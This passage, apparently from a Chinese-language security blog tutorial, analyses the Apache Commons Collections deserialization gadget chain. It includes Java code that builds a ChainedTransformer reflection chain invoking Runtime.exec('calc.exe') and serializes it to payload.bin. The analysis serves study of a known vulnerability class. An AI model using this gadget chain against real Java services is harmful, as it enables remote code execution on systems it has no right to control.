href="https://imgtu.com/i/RDx3CR"><img src="https://z3.ax1x.com/2021/07/01/RDx3CR.png" alt="RDx3CR.png"></a></p><p><code>org.apache.commons.collections.map.AbstractInputCheckedMapDecorator#setValue</code></p><p>首先进入的是<code>setValue()</code>方法，调用了<code>checkSetValue()</code></p><p><a href="https://imgtu.com/i/RDxQUJ"><img src="https://z3.ax1x.com/2021/07/01/RDxQUJ.png" alt="RDxQUJ.png"></a></p><p><code>org.apache.commons.collections.map.TransformedMap#checkSetValue</code></p><p><code>this.valueTransformer</code>等于<code>ChainedTransformer</code>类，调用了<code>ChainedTransformer</code>类中的<code>transform</code>方法</p><p><a href="https://imgtu.com/i/RDx881"><img src="https://z3.ax1x.com/2021/07/01/RDx881.png" alt="RDx881.png"></a></p><p><code>org.apache.commons.collections.functors.ChainedTransformer#transform</code></p><p><a href="https://imgtu.com/i/RDxl59"><img src="https://z3.ax1x.com/2021/07/01/RDxl59.png" alt="RDxl59.png"></a></p><p>根据<code>this.iTransformers</code>数组的值可以知道，第一次进入的是<code>ConstantTransformer</code>类的<code>transform</code>方法，后三次进入的是<code>InvokerTransformer</code>类的<code>transform</code>。<code>transform</code>的返回值会作为下个<code>transform</code>函数的参数，然后继续执行</p><p><a href="https://imgtu.com/i/RDxdVe"><img src="https://z3.ax1x.com/2021/07/01/RDxdVe.png" alt="RDxdVe.png"></a></p><p>看一下<code>ChainedTransformer</code>的构造函数，可以发现<code>this.iTransformers</code>可控</p><p><a href="https://imgtu.com/i/RDxo2q"><img src="https://z3.ax1x.com/2021/07/01/RDxo2q.png" alt="RDxo2q.png"></a></p><p><code>org.apache.commons.collections.functors.ChainedTransformer#ConstantTransformer</code></p><p>第一次进入的<code>transform</code></p><p><a href="https://imgtu.com/i/RDxUbD"><img src="https://z3.ax1x.com/2021/07/01/RDxUbD.png" alt="RDxUbD.png"></a></p><p><code>org.apache.commons.collections.functors.InvokerTransformer#transform</code></p><p>后三次进入<code>InvokerTransformer</code>的<code>Transformer</code>方法，这里存在反射调用，参数可控。</p><p>执行过程</p><ul><li>setValue()</li><li>checkSetvalue()</li><li>ChainedTransformer类中的<code>transform</code>方法</li><li>四次循环，第一次进入ConstantTransformer的transform，后三次进入InvokerTransformer的transform</li><li>触发反射</li></ul><h1 id="反射链"><a href="#反射链" class="headerlink" title="反射链"></a>反射链</h1><p><code>org.apache.commons.collections.functors.InvokerTransformer#transform</code></p><p>这里实现了反射调用，如果<code>input</code>等于<code>Runtime类</code>，那么<code>input.getClass</code>获取到的是<code>java.lang.class</code>，这样无法获取到方法，必须让<code>input</code>等于<code>Runtime实例</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> Object <span class="hljs-title">transform</span><span class="hljs-params">(Object input)</span> </span>&#123;<br>        <span class="hljs-keyword">if</span> (input == <span class="hljs-keyword">null</span>) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-keyword">null</span>;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">try</span> &#123;<br>                <br>                <span class="hljs-comment">//input必须为Runtime的实例，cls才会等于Runtime类，</span><br>                Class cls = input.getClass();<br>                <br>                <span class="hljs-comment">//this.iMethodName等于exec，this.iParamTypes等于String.class</span><br>                Method method = cls.getMethod(<span class="hljs-keyword">this</span>.iMethodName, <span class="hljs-keyword">this</span>.iParamTypes);<br>                <span class="hljs-comment">//this.Args为要执行的命令</span><br>                <span class="hljs-keyword">return</span> method.invoke(input, <span class="hljs-keyword">this</span>.iArgs); <br>            &#125; <br>           .........<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>看一下构造函数，三个属性都是传入参数</p><p><a href="https://imgtu.com/i/RDxNDO"><img src="https://z3.ax1x.com/2021/07/01/RDxNDO.png" alt="RDxNDO.png"></a></p><p>参考反射命令执行代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java">Class.forName(<span class="hljs-string">&quot;java.lang.Runtime&quot;</span>)<br>                .getMethod(<span class="hljs-string">&quot;exec&quot;</span>, String.class)<br>                .invoke(                        Class.forName(<span class="hljs-string">&quot;java.lang.Runtime&quot;</span>).getMethod(<span class="hljs-string">&quot;getRuntime&quot;</span>).invoke(Class.forName(<span class="hljs-string">&quot;java.lang.Runtime&quot;</span>))<br>                        ,<br>                        <span class="hljs-string">&quot;calc.exe&quot;</span><br>                );<br></code></pre></td></tr></table></figure><p>需要满足以下条件</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">this</span>.iMethodName=“exec”<br><span class="hljs-keyword">this</span>.iParamTypes=String.class<br>input=Class.forName(<span class="hljs-string">&quot;java.lang.Runtime&quot;</span>).getMethod(<span class="hljs-string">&quot;getRuntime&quot;</span>).invoke(Class.forName(<span class="hljs-string">&quot;java.lang.Runtime&quot;</span>))<br><span class="hljs-keyword">this</span>.iArgs=<span class="hljs-string">&quot;calc.exe&quot;</span><br></code></pre></td></tr></table></figure><p>尝试尝试构造执行命令</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Commons_collections_Test</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;<br>        InvokerTransformer invokerTransformer=<span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;exec&quot;</span>,<span class="hljs-keyword">new</span> Class[]&#123;String.class&#125;,<span class="hljs-keyword">new</span> String[]&#123;<span class="hljs-string">&quot;calc.exe&quot;</span>&#125;);<br>        invokerTransformer.transform(Class.forName(<span class="hljs-string">&quot;java.lang.Runtime&quot;</span>).getMethod(<span class="hljs-string">&quot;getRuntime&quot;</span>).invoke(Class.forName(<span class="hljs-string">&quot;java.lang.Runtime&quot;</span>)));<br><br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p><a href="https://imgtu.com/i/RDxwUH"><img src="https://z3.ax1x.com/2021/07/01/RDxwUH.png" alt="RDxwUH.png"></a></p><p>可以成功执行，但是还存在一个问题就是无法传入<code>Runtime</code>的实例对象。</p><h2 id="两种获取Runtime实例的错误思路"><a href="#两种获取Runtime实例的错误思路" class="headerlink" title="两种获取Runtime实例的错误思路"></a>两种获取Runtime实例的错误思路</h2><p>用readObject模拟反序列化</p><p>序列化</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> java.io.FileInputStream;<br><span class="hljs-keyword">import</span> java.io.FileOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Commons_collections_Test</span> </span>&#123;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;<br><br><br>        <span class="hljs-comment">//构造InvokerTransformer</span><br>        InvokerTransformer a=<span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;exec&quot;</span>,<span class="hljs-keyword">new</span> Class[]&#123;String.class&#125;,<span class="hljs-keyword">new</span> String[]&#123;<span class="hljs-string">&quot;calc.exe&quot;</span>&#125;);<br><br>        <span class="hljs-comment">//序列化</span><br>        FileOutputStream f=<span class="hljs-keyword">new</span> FileOutputStream(<span class="hljs-string">&quot;payload.bin&quot;</span>);<br>        ObjectOutputStream fout=<span class="hljs-keyword">new</span> ObjectOutputStream(f);<br>        fout.writeObject(a);<br><br><br>        <span class="hljs-comment">//构造传入transform的参数，Runtime实例</span><br>        Object input=Class.forName(<span class="hljs-string">&quot;java.lang.Runtime&quot;</span>).getMethod(<span class="hljs-string">&quot;getRuntime&quot;</span>).invoke(Class.forName(<span class="hljs-string">&quot;java.lang.Runtime&quot;</span>));<br><br>        <span class="hljs-comment">//反序列化</span><br>        FileInputStream fi=<span class="hljs-keyword">new</span> FileInputStream(<span class="hljs-string">&quot;payload.bin&quot;</span>);<br>        ObjectInputStream fin=<span class="hljs-keyword">new</span> ObjectInputStream(fi);<br>        InvokerTransformer b=(InvokerTransformer) fin.readObject();<br><br>        <span class="hljs-comment">//触发漏洞，调用transform，input为传入参数</span><br>        b.transform(input);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>反序列化</p><p>可以看到存在一个问题，必须给<code>transform</code>传入一个构造好的Runtime实例也就是<code>input</code>才可以触发漏洞，实际环境里不可能有这样一个构造好的实例，那么能否利用反序列化给<code>transform</code>传入Runtime实例呢？</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><br><span class="hljs-keyword">import</span> java.io.FileInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.Serializable;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Serial</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">Serializable</span>  </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception</span>&#123;<br>        <span class="hljs-comment">//构造传入transform的参数，为Runtime实例，</span><br>        Object input=Class.forName(<span class="hljs-string">&quot;java.lang.Runtime&quot;</span>).getMethod(<span class="hljs-string">&quot;getRuntime&quot;</span>).invoke(Class.forName(<span class="hljs-string">&quot;java.lang.Runtime&quot;</span>));<br><br>        <span class="hljs-comment">//反序列化</span><br>        FileInputStream fi=<span class="hljs-keyword">new</span> FileInputStream(<span class="hljs-string">&quot;payload.bin&quot;</span>);<br>        ObjectInputStream fin=<span class="hljs-keyword">new</span> ObjectInputStream(fi);<br>        InvokerTransformer b=(InvokerTransformer) fin.readObject();<br><br>        <span class="hljs-comment">//触发漏洞，调用transform，input为传入参数</span><br>        b.transform(input);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p><a href="https://imgtu.com/i/RDxr8I"><img src="https://z3.ax1x.com/2021/07/01/RDxr8I.png" alt="RDxr8I.png"></a></p><p><code>org.apache.commons.collections.functors.ChainedTransformer#transform</code></p><p>这里可以控制传入<code>transform</code>的参数，因为<code>object</code>的来源是上一次<code>this.ITransformers[i].transform</code>的返回值，而且因为<code>iTransformers</code>可控，我们可以调用任意一个类的<code>transform</code>方法</p><p><a href="https://imgtu.com/i/RDxl59"><img src="https://z3.ax1x.com/2021/07/01/RDxl59.png" alt="RDxl59.png"></a></p><p><code>org.apache.commons.collections.functors.ChainedTransformer#ConstantTransformer</code></p><p>这里我们可以控制<code>this.iContant</code>，它会等于下一次执行的传入参数<code>object</code>。表面上看让它等于<code>Runtime实例</code>就解决了之前无法传入<code>Runtime</code>实例的问题，但是实际上并不可行，因为Runtime类不能被反序列化</p><p><a href="https://imgtu.com/i/RDxUbD"><img src="https://z3.ax1x.com/2021/07/01/RDxUbD.png" alt="RDxUbD.png"></a></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> java.io.FileInputStream;<br><span class="hljs-keyword">import</span> java.io.FileOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Commons_collections_Test</span> </span>&#123;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;<br><br><br>        <span class="hljs-comment">//构造Transformers数组</span><br>        Transformer[] transformers=<span class="hljs-keyword">new</span> Transformer[]&#123;<br>                <span class="hljs-keyword">new</span> ConstantTransformer(Class.forName(<span class="hljs-string">&quot;java.lang.Runtime&quot;</span>).getMethod(<span class="hljs-string">&quot;getRuntime&quot;</span>).invoke(Class.forName(<span class="hljs-string">&quot;java.lang.Runtime&quot;</span>))),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;exec&quot;</span>,<span class="hljs-keyword">new</span> Class[]&#123;String.class&#125;,<span class="hljs-keyword">new</span> String[]&#123;<span class="hljs-string">&quot;calc.exe&quot;</span>&#125;)<br>        &#125;;<br><br>        <span class="hljs-comment">//用ChainedTransformer封装构造好的Transformers数组，也就是让构造好的数组等于this.iTransformers</span><br>        Transformer transformerChain=<span class="hljs-keyword">new</span> ChainedTransformer(transformers);<br><br>        <span class="hljs-comment">//序列化</span><br>        FileOutputStream f=<span class="hljs-keyword">new</span> FileOutputStream(<span class="hljs-string">&quot;payload.bin&quot;</span>);<br>        ObjectOutputStream fout=<span class="hljs-keyword">new</span> ObjectOutputStream(f);<br>        fout.writeObject(transformerChain);<br><br><br>       <br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>执行失败</p><p><a href="https://imgtu.com/i/RDxDPA"><img src="https://z3.ax1x.com/2021/07/01/RDxDPA.png" alt="RDxDPA.png"></a></p><p>换一种思路，有没有可能利用反射直接在服务器生成一个Runtime实例？</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> java.io.FileInputStream;<br><span class="hljs-keyword">import</span> java.io.FileOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Commons_collections_Test</span> </span>&#123;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;<br><br><br>        <span class="hljs-comment">//构造transformers</span><br>        Transformer[] transformers=<span class="hljs-keyword">new</span> Transformer[]&#123;<br>                <span class="hljs-keyword">new</span> ConstantTransformer(Runtime.class),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;getRuntime&quot;</span>,<span class="hljs-keyword">new</span> Class[]&#123;&#125;,<span class="hljs-keyword">new</span> Object[]&#123;&#125;),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;exec&quot;</span>,<span class="hljs-keyword">new</span> Class[]&#123;String.class&#125;,<span class="hljs-keyword">new</span> String[]&#123;<span class="hljs-string">&quot;calc.exe&quot;</span>&#125;)<br>        &#125;;<br><br>        Transformer transformerChain=<span class="hljs-keyword">new</span> ChainedTransformer(transformers);<br><br>        transformerChain.transform(<span class="hljs-keyword">null</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>依然报错，原因是前面提到的反射机制，<code>Runtime.class</code>返回<code>java.lang.class</code>，这里我们必须把<code>Runtime.class</code>换成<code>Runtime实例.class</code>才能按预想中的执行，但是我们现在就在想办法得到<code>Runtime实例</code>，这样就变成一个死循环了。这个方法也不行</p><p><a href="https://imgtu.com/i/RDx05d"><img src="https://z3.ax1x.com/2021/07/01/RDx05d.png" alt="RDx05d.png"></a></p><h2 id="反射-反射"><a href="#反射-反射" class="headerlink" title="反射+反射"></a>反射+反射</h2><p><code>getRuntime</code>方法会返回<code>Runtime实例</code>，只要获取到了<code>getRuntime</code>方法再<code>invoke</code>执行就等于获取到了<code>Runtime实例</code>。既然无法直接获取Runtime实例，那可以去尝试获取getRuntime方法。</p><p><strong>注意：开始传入的是java.lang.class类（Runtime.class）</strong></p><p>步骤</p><ol><li><p>通过反射机制获取反射机制中的getMethod类，由于getMethod类是存在Class类中，就符合开头Class类的限制</p></li><li><p>通过getMethod函数获取Runtime类中的getRuntime函数。在哪个类中调用getMethod去获取方法，实际上是由invoke函数里面的的第一个参数obj决定的</p></li><li><p>再通过反射机制获取反射机制中的invoke类，执行上面获取的getRuntime函数</p></li><li><p>invoke调用getRuntime函数，获取Runtime类的实例。里在使用反射机制调用getRuntime静态类时，invoke里面第一个参数obj其实可以任意改为null，或者其他类，而不一定要是Runtime类</p></li></ol><p><strong>关于反射</strong></p><p>类.getMethod(要获取的方法名,要获取方法的参数类型) 获得方法对象<br>方法对象.invoke(相关类实例/相关类,参数)  执行方法</p><p>invoke的第一个参数是执行method的对象obj：<br>        如果这个方法是一个普通方法，那么第一个参数是类对象<br>        如果这个方法是一个静态方法，那么第一个参数是类</p><p>接下来分析一下利用反射机制进行反射调用的过程</p><p>第一次循环直接返回了<code>Runtime.class</code></p><p><a href="https://imgtu.com/i/RDxUbD"><img src="https://z3.ax1x.com/2021/07/01/RDxUbD.png" alt="RDxUbD.png"></a></p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">input1=<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Runtime</span>.</span></span><span class="hljs-keyword">class</span><br></code></pre></td></tr></table></figure><p>第二次</p><p>实际执行的代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//第二次循环</span><br>       Class cls2=input1.getClass(); <span class="hljs-comment">//cls2:java.lang.class类</span><br>       Method method2=cls2.getMethod(<span class="hljs-string">&quot;getMethod&quot;</span>, String.class, Class[].class);<span class="hljs-comment">//method2:通过反射获取到的getMethod对象</span><br>       Object input2=method2.invoke(input1,<span class="hljs-keyword">new</span> Object[] &#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;&#125; &#125;);<span class="hljs-comment">//input2:getRuntime对象</span><br></code></pre></td></tr></table></figure><p><a href="https://imgtu.com/i/RDxh5j"><img src="https://z3.ax1x.com/2021/07/01/RDxh5j.png" alt="RDxh5j.png"></a></p><p><a href="https://imgtu.com/i/RDxfaQ"><img src="https://z3.ax1x.com/2021/07/01/RDxfaQ.png" alt="RDxfaQ.png"></a></p><p><a href="https://imgtu.com/i/RDxIGn"><img src="https://z3.ax1x.com/2021/07/01/RDxIGn.png" alt="RDxIGn.png"></a></p><p>第三次循环，最重要的一步，先用反射获取<code>invoke方法对象</code>，然后利用<code>invoke方法对象.invoke</code>执行传入<code>getRuntime</code>方法对象，得到<code>Runtime</code>实例</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//第三次循环，input是通过反射获取到的getRuntime对象</span><br>        Class cls3=input2.getClass();<span class="hljs-comment">//java.lang.reflec.Method类</span><br>        Method method3=cls3.getMethod(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> Class[] &#123;Object.class, Object[].class &#125;);<span class="hljs-comment">//method3:invoke方法对象.第二个参数为invoke的参数类型</span><br><br>        <span class="hljs-comment">//invoke方法对象.invoke(input, this.iArgs)实际上等于input.invoke(this.iArgs)</span><br>        Object input3=method3.invoke(input2,<span class="hljs-keyword">new</span> Object[] &#123;<span class="hljs-keyword">null</span>, <span class="hljs-keyword">new</span> Object[]&#123;&#125; &#125;); <span class="hljs-comment">//input3:Runtime实例</span><br></code></pre></td></tr></table></figure><p><a href="https://imgtu.com/i/RDxs2t"><img src="https://z3.ax1x.com/2021/07/01/RDxs2t.png" alt="RDxs2t.png"></a></p><p><a href="https://imgtu.com/i/RDxgr8"><img src="https://z3.ax1x.com/2021/07/01/RDxgr8.png" alt="RDxgr8.png"></a></p><p>第四次循环</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//第四次循环，已经获取到了Runtime实例</span><br>       Class cls4=input3.getClass(); <span class="hljs-comment">//cls4:java.lang.Runtime类</span><br>       Method method4=cls4.getMethod(<span class="hljs-string">&quot;exec&quot;</span>,<span class="hljs-keyword">new</span> Class[] &#123;String.class &#125;);<span class="hljs-comment">//method4:exec方法对象</span><br>       method4.invoke(input3,<span class="hljs-keyword">new</span> Object[] &#123;<span class="hljs-string">&quot;calc.exe&quot;</span>&#125;);<span class="hljs-comment">//exec方法对象.invoke(Runtime实例,参数)</span><br></code></pre></td></tr></table></figure><p><a href="https://imgtu.com/i/RDxcKf"><img src="https://z3.ax1x.com/2021/07/01/RDxcKf.png" alt="RDxcKf.png"></a></p><p><a href="https://imgtu.com/i/RDx2qS"><img src="https://z3.ax1x.com/2021/07/01/RDx2qS.png" alt="RDx2qS.png"></a></p><p>简化流程</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Commons_collections_Test</span> </span>&#123;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;<br><br>        <span class="hljs-comment">//第一次循环,返回了Runtie.class</span><br>        Class input1=Runtime.class;<br><br>        <span class="hljs-comment">//第二次循环</span><br>        Class cls2=input1.getClass(); <span class="hljs-comment">//cls2:java.lang.class类</span><br>        Method method2=cls2.getMethod(<span class="hljs-string">&quot;getMethod&quot;</span>, String.class, Class[].class);<span class="hljs-comment">//method2:通过反射获取到的getMethod对象</span><br>        Object input2=method2.invoke(input1,<span class="hljs-keyword">new</span> Object[] &#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;&#125; &#125;);<span class="hljs-comment">//input2:getRuntime对象</span><br><br>        <span class="hljs-comment">//第三次循环，input是通过反射获取到的getRuntime对象</span><br>        Class cls3=input2.getClass();<span class="hljs-comment">//java.lang.reflec.Method类</span><br>        Method method3=cls3.getMethod(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> Class[] &#123;Object.class, Object[].class &#125;);<span class="hljs-comment">//method3:invoke方法对象.第二个参数为invoke的参数类型</span><br><br>        <span class="hljs-comment">//invoke方法对象.invoke(input, this.iArgs)实际上等于input.invoke(this.iArgs)</span><br>        Object input3=method3.invoke(input2,<span class="hljs-keyword">new</span> Object[] &#123;<span class="hljs-keyword">null</span>, <span class="hljs-keyword">new</span> Object[]&#123;&#125; &#125;); <span class="hljs-comment">//input3:Runtime实例</span><br><br>        <span class="hljs-comment">//第四次循环，已经获取到了Runtime实例</span><br>        Class cls4=input3.getClass(); <span class="hljs-comment">//cls4:java.lang.Runtime类</span><br>        Method method4=cls4.getMethod(<span class="hljs-string">&quot;exec&quot;</span>,<span class="hljs-keyword">new</span> Class[] &#123;String.class &#125;);<span class="hljs-comment">//method4:exec方法对象</span><br>        method4.invoke(input3,<span class="hljs-keyword">new</span> Object[] &#123;<span class="hljs-string">&quot;calc.exe&quot;</span>&#125;);<span class="hljs-comment">//exec方法对象.invoke(Runtime实例,参数)</span><br><br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="反序列化触发点"><a href="#反序列化触发点" class="headerlink" title="反序列化触发点"></a>反序列化触发点</h1><p>到目前为止我们已经构造好了反射利用链，现在来看一下如何触发，触发需要两个条件</p><ol><li>服务器调用readObject反序列化构造好的ChainedChainedTransformer</li><li>调用反序列化后的ChainedTransformer类中的transform方法执行命令</li></ol><p>代码如下，实际环境中基本不可能满足这两个条件，因此我们需要寻找其他触发方式</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span 